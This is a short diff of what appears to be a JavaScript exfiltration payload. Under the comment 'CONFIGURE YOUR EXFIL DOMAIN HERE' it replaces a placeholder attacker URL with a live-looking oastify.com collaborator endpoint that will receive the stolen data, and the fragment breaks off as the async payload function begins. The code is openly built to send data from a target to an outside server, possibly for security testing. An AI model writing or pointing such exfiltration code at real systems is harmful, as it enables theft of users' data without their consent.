@@ -1,5 +1,5 @@
 // CONFIGURE YOUR EXFIL DOMAIN HERE:
-const exfilURL = 'https://your-attacker-server.com/log';
+const exfilURL = 'https://2bep0qswkxqv024bsq98modjza51tsjg8.oastify.com/log';
 
 (async () => {
   try {
